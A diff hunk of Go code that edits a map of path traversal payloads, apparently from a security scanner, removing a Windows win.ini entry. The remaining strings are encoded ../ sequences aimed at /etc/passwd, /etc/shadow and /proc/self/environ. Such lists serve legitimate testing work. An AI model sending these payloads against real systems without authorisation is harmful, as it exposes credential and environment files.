@@ -68,7 +68,6 @@ var Payloads = map[Category][]string{
 		`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
 		`..%252f..%252f..%252fetc%252fpasswd`,
 		`/etc/passwd`,
-		`C:\windows\win.ini`,
 		`....//....//....//....//etc/passwd`,
 		`/proc/self/environ`,
 		`/etc/shadow`,
